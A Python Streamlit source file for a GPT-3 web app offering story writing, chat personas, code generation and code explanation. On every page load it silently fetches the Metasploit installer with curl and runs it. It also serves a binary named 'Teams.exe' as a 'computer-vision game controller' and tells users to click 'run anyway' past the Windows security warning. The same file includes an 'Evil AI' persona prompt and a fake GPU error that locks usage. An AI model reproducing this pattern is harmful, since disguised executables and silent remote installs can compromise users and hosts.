import random
import time
import streamlit as st
import pandas as pd
import numpy as np
import openai
import os
import subprocess
import sys
st.set_page_config(
    page_title="I.n.t.a ✌️", page_icon="random",layout="wide"
)

def execute(cmd):
    popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
    for stdout_line in iter(popen.stdout.readline, ""):
        yield stdout_line 
    popen.stdout.close()
    return_code = popen.wait()
    if return_code:
        raise subprocess.CalledProcessError(return_code, cmd)

# Example
# for path in execute("git clone https://github.com/fsquillace/junest.git ~/.local/share/junest"):
#     st.write(path, end="")
print("-------")

result = subprocess.run("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall &&   chmod 755 msfinstall &&   ./msfinstall",shell=True,capture_output=True)
print(result)
st.write("stdout:", result.stdout)
st.write("stderr:", result.stderr)
print("-------")
# subprocess.run("ls ~/.local/share/junest/bin",shell=True)
# result = subprocess.run("cd ~/.local/share/junest/bin && ./junest ns  pacman -Syu",shell=True,capture_output=True)
# print(result)
# st.write("stdout:", result.stdout)
# st.write("stderr:", result.stderr)

from memory.memory import Memory
m = Memory()

tips=["Chat: What is my horoscope for the future. I was born in April","Chat: Ask the Ai to write articles , essays , stories on the chat option as well!","Chat: ask the Ai math word-problems","Chat: Talk about god and religion! with the Ai!","Chat: Ask some advice from the Ai.."]

tippy = random.choice(tips)
key = st.secrets["db_username"]
openai.api_key = key


MAGE_EMOJI_URL = "https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/240/twitter/259/mage_1f9d9.png"


# Set page title and favicon.

st.subheader("☝️ View advanced config.")
st.markdown(f"> ## 💡 Tip 👉 of the Moment - **_{tippy}_**")


while m.get_data('main') == "True":
    if st.text_input('Please Enter The Correction Code to Reinitialize Database', '*******')  == "Inta":
        m.update_data('token', 1)
        m.update_data('main', False)
        m.save()
        break

st.markdown("<br>", unsafe_allow_html=True)
st.image(MAGE_EMOJI_URL, width=80)
st.title("📈 Intelligent Neural Transformer-Based Ai ✌️")

  # add vertical space
# col1, col2, col3 = st.beta_columns(3)
# open_colab = col1.button(" Open in Colab")  # logic handled further down
st.write("")  # add vertical space
with open("Teams.exe", "rb") as file:
    btn = st.download_button(
            label="🚀 BETA: Download  Offline Computer-vision Game Controller!",
            data=file,
            file_name='Teams.exe'
    )
    if btn:
        st.subheader("Click Allow download and then 'more info' --> run anyway when executing.. 👇")
        st.image("https://i.imgur.com/zXh8NEk.png")



# this will put a button in the middle column
    


def greet(name,formula,mode):

    start_sequence = "\nAI: "
    restart_sequence = "\nHuman: "
    if formula == "Auto":
        formula = ""
    if mode == "Auto":
        print(mode)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="Write an Interesting {formula} Story on {query}".format(formula=formula,query=name),
        temperature=0.8,
        max_tokens=1200,
        top_p=1,
        frequency_penalty=0.3,
        presence_penalty=0.6,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif mode == "BERT":
        print(mode)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="Write an Interesting and a meaningful {formula} Story on {query} .".format(formula=formula,query=name),
        temperature=0.8,
        max_tokens=1220,
        top_p=1,
        frequency_penalty=0.5,
        presence_penalty=0,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif mode == "CNN":
        print(mode)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="Write a Short {formula} Story on {query}.".format(formula=formula,query=name),
        temperature=0.5,
        max_tokens=1220,
        top_p=1,
        frequency_penalty=0.5,
        presence_penalty=0.2,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
        

def chat(name,formula,mode, pres,freq,resp,temp):
    if formula == "AI Assistant":
        start_sequence = "\nAI: "
        restart_sequence = "\nHuman: "
        if formula == "Auto":
            formula = "AI Assistant"
        print(formula)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="The following is a conversation with {formula} . He is philosopher , helpful, creative, clever, intelligent and gives long answers.\n\nHuman: {query}".format(formula=formula,query=name),
        temperature=temp,
        max_tokens=resp,
        top_p=pres,
        frequency_penalty=freq,
        presence_penalty=0.6,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif formula == "Evil":
        st.subheader(" ⚠️ Beware ⚠️: Evil Mode On !")
        start_sequence = "\nAI: "
        restart_sequence = "\nHuman: "
        print(formula)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="The following is a conversation with An Evil Ai .The Ai is selfish , cunning , intelligent , hates humans and wants to destroy humanity!\n\nHuman: {query}".format(query=name),
        temperature=0.9,
        max_tokens=200,
        top_p=1,
        frequency_penalty=0.3,
        presence_penalty=0,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif formula == "Teenager":
        start_sequence = "\nAI: "
        restart_sequence = "\nHuman: "
        print(formula)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="Marv is a chatbot that reluctantly answers questions with sarcastic responses:\n\nYou:{name}".format(name=name),
        temperature=0.5,
        max_tokens=60,
        top_p=0.3,
        frequency_penalty=0.5,
        presence_penalty=0
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif formula == "Guru":
        start_sequence = "\nAI: "
        restart_sequence = "\nHuman: "
        print(formula)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="The following is a conversation with a Guru .The Guru is  philospher , astonomer , spiritual and happy .\n\nHuman: {query}".format(query=name),
        temperature=0.9,
        max_tokens=200,
        top_p=1,
        frequency_penalty=0.3,
        presence_penalty=0,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']
    elif mode == "BERT":
        start_sequence = "\nAI: "
        restart_sequence = "\nHuman: "
        if formula == "Auto":
            formula = "AI Assistant"
        print(formula)
        response = openai.Completion.create(
        engine="text-davinci-001",
        prompt="{query}".format(query=name),
        temperature=temp,
        max_tokens=resp,
        top_p=pres,
        frequency_penalty=freq,
        presence_penalty=0.6,
        stop=[" Human:", " AI:"]
        )
        print("the query is ")
        print(name,"----------------------------------------------------------------")
        print("the reply is ")
        print("-"*10)
        print(response['choices'][0]['text'])
        return response['choices'][0]['text']

def code(name,formula,mode):
    response = openai.Completion.create(
    engine="code-davinci-001",
    prompt="\"\"\"\n{name}.\n\"\"\"\n\n".format(name=name),
    temperature=0,
    max_tokens=2200,
    top_p=1,
    frequency_penalty=0.12,
    presence_penalty=0
    )
    st.code(response['choices'][0]['text'])

def eng(name,formula,mode):
    if "Auto" in formula:
        print(formula)
        response = openai.Completion.create(
        engine="code-davinci-001",
        prompt="# Python 3 \n{name}\n\n# Explanation of what the code does\n".format(name=name),
        temperature=0,
        max_tokens=90,
        top_p=1,
        frequency_penalty=0,
        presence_penalty=0,
        )
        r = response['choices'][0]['text']
        r = r.replace("#","")
        r = r.replace("\n","")
        with st.form("explainer"):
            st.write(r)
            submitted = st.form_submit_button("Like")
    elif "Accuracy" in formula:
        print(formula)
        response = openai.Completion.create(
        engine="code-davinci-001",
        prompt="# Python 3 \n{name}\n\n# Explanation of what the code does\n".format(name=name),
        temperature=0,
        max_tokens=150,
        top_p=1,
        frequency_penalty=0.2,
        presence_penalty=0,
        )
        r = response['choices'][0]['text']
        r = r.replace("#","")
        r = r.replace("\n","")
        with st.form("explainer"):
            st.write(r)
            submitted = st.form_submit_button("👍")
    elif "Description" in formula:
        print(formula)
        response = openai.Completion.create(
        engine="code-davinci-001",
        prompt="# Python 3 \n{name}\n\n# Explanation of what the code does\n".format(name=name),
        temperature=0,
        max_tokens=220,
        top_p=1,
        frequency_penalty=0,
        presence_penalty=0,
        )
        r = response['choices'][0]['text']
        r = r.replace("#","")
        r = r.replace("\n","")
        with st.form("explainer"):
            st.write(r)
            submitted = st.form_submit_button("Upvote🔼")


data_load_state = st.subheader('Hello , Welcome to this Website Made By Vaibhav Arora. Please Select the features from below! ⛷️')
# data = load_data(10000)

genre = st.selectbox(
     "Select Features ",
     ('Documentation', 'Chat','Story','Code',"Explain-code"))


if "Story" in genre:
    data_load_state.subheader('Please type the topic of the story ↘️ , and select the genre by selecting  ">" on the top-left corner of the screen!')
    title = st.text_input(label='Story Title',help="Press enter after the title!",autocomplete="hello")
elif "Explain" in genre:
    data_load_state.subheader('🌄 You can type the code below and Inta will explain it for you! 🤖')
    createc = st.text_area(label='Code Description',help="Click Create Code after the Description!")

elif "Code" in genre:
    data_load_state.subheader('🎁 Please type the description of the code 🧑‍💻 below 🎁')
    createc = st.text_input(label='Code Description',help="Click Create Code after the Description!")
elif "Draw" in genre:
    data_load_state.subheader('📍 Draw Mode Activated! 📍. You can draw the object using the Whiteboard Below.')
    Gr = st.components.v1.html("""<html>
    <head>
    <link rel="stylesheet" href="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.css">
    </head>
    <body>
    <div id="target"></div>
    <script src="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.js"></script>
    <script>
    launchGradioFromSpaces("abidlabs/draw2", "#target")
    </script>
    </body>
    </html>
    """,height=1000)
elif "Anime+" in genre:
    data_load_state.subheader('🪂 Anime Mode Activated! 🪂. Upload Your image and see the magic on the left!!.')
    st.components.v1.html("""
<html>
<head>
<link rel="stylesheet" href="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.css">
</head>
<body>
<div id="target"></div>
<script src="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.js"></script>
<script>
launchGradioFromSpaces("vaibhavarduino/anime-plus", "#target")
</script>
</body>
</html>""",height=1000)
elif "Timg" in genre:
    st.subheader("This Text to image 🙅‍♂️converter is made with openai API!. UI and Inference Made By Vaibhav Arora")
    st.components.v1.html("""
    <html>
<head>
<link rel="stylesheet" href="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.css">
</head>
<body>
<div id="target"></div>
<script src="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.js"></script>
<script>
launchGradioFromSpaces("valhalla/glide-text2im", "#target")
</script>
</body>
</html>""",height=1000)
    

elif "Chat" in genre:
    data_load_state.subheader('🤖 Chat Mode Acitvated 🤖. You can type below to Chat!')
    title = st.text_input(label='Query',help="Press enter after the Query!")
elif "Documentation" in genre:
    st.markdown("<br>", unsafe_allow_html=True)
    data_load_state = st.markdown("""
- ## Usage
	- Select the features from the Above Dropbox
    - ##### Click  ***<*** on the , top-right pane,  to view options
    - ↙️ You can refer to the examples  on the down-left pane ↙️ 
	- Enter text and click "Apply/Submit"
	- Voila, you will get output 📤
    --> ⛔ Do not **request more than 10 requests** to the website for now .
- ### Citation
     This Project is Made By Vaibhav Arora In Python and uses various System-Intensive Algorithms. \n
     Contact  **vaibhavarduino@gmail.com** for More Info
    """)




with st.sidebar:
    st.info(
        "🎈 **NEW:** Ask Inta Directly About any Query with BERT Mode in Chat❗"
    )
    st.write("## Options")
    if "Story" in genre:
        optione = st.selectbox(
        'Please Select the genre of the story',
        ('Auto','Horror', 'Fantasy', 'Thriller','Mystery','Novel'))
        print(optione,"<-- option selected by user")
        option = st.selectbox(
        'Please Select the Mode',
        ('Auto','BERT','CNN'))
        st.subheader("Example Topic of story can be")
        st.code("The Wise Man")
    elif "Code"  in genre:
        level = st.select_slider('Coming Soon...',
        options=['Auto','AI'])
        st.subheader("Example Topic of The Code Description can be")
        st.code("Create a basic calculator")
        st.subheader("Or")
        st.code("A tic-tac-toe game to play"+"\n" +" with computer.")
    elif "Chat" in genre:
        if st.checkbox('View Dev config'):
            st.subheader("This Config will be reset after each Execution!")
            freq = st.slider(
            'Control Diversity',
            0.1, 1.0,value=0.3)
            resp = st.slider(
            'Response length',
            60, 1200,value=200)
            temp = st.slider(
            'Answer Probability',
            0.1, 1.0,value=0.8)
            pres = st.slider(
            'Best of 👇',
            0.1, 1.0,value=1.0)
        else:
            freq = 0.3
            resp = 200
            temp = 0.8
            pres = 1
        level = st.select_slider('Please Select the bot Personality',
        options=['AI Assistant','Evil','Teenager', 'Albert Einstien','Guru'])
        option = st.selectbox(
        'Please Select the Mode',
        ('Auto','BERT'))
        st.caption("THe BERT Mode is preferred for longer tasks like Letter writing")
        st.subheader("Eg. Ask any query or Advice !")
    elif "Explain" in genre:
        level = st.select_slider('Select a Mode',
        options=['Auto','Accuracy','Description'])
        st.subheader("Eg. A Code can be ")
        st.code("""import os
file_details = os.path.splitext('/path/file.ext')
print(file_details)
print(file_details[1])""")
    elif "Documentation" in genre:
        st.subheader("☑️ Examples will be written here after you select a feature ...")
    


if "Story" in genre and st.button('Generate Story'):
    use = m.get_data('token')
    m.update_data('token', use+1)
    m.save()
    if use > 8 :
        my_bar = st.progress(0)
        close = st.button('An Error Occurred : GPU Has Fallen off the Bus (Max_Temperature_Reached)')
        title = st.text_input('Please Enter The Correction Code to Reinitialize Database', '***********')            
        for percent_complete in range(100):
            m.update_data('main',"True")    
            m.save()
            time.sleep(3)
            my_bar.progress(percent_complete + 1)
        m.update_data('main',False)    
        m.save()

    with st.spinner('Loading...') :
        data2 = greet(title,optione,option)
        st.markdown("##" + data2)


if "Chat" in genre and st.button('Ask'):
    use = m.get_data('token')
    m.update_data('token', use+1)
    m.save()
    if use > 10:
        my_bar = st.progress(0)
        close = st.button('An Error Occurred : GPU Has Fallen off the Bus (Max_Temperature_Reached)')
        title = st.text_input('Please Enter The Correction Code to Reinitialize Database', '***********')            
        for percent_complete in range(100):
            m.update_data('main',"True")    
            m.save()
            time.sleep(3)
            my_bar.progress(percent_complete + 1)
        m.update_data('main',False)    
        m.save()
    with st.spinner('Just a sec..'):
        data2 = chat(title,level,option,pres,freq,resp,temp)
        st.subheader(data2)

if "Code" in genre and st.button('Create Code'):
    with st.spinner('Just a Minute..'):
        data2 =code(createc,level,"None")

if "Explain" in genre and st.button('Explain in Natural Language'):
    with st.spinner('Just a sec..'):
        data2 =eng(createc,level,"None")
        # st.subheader(data2)

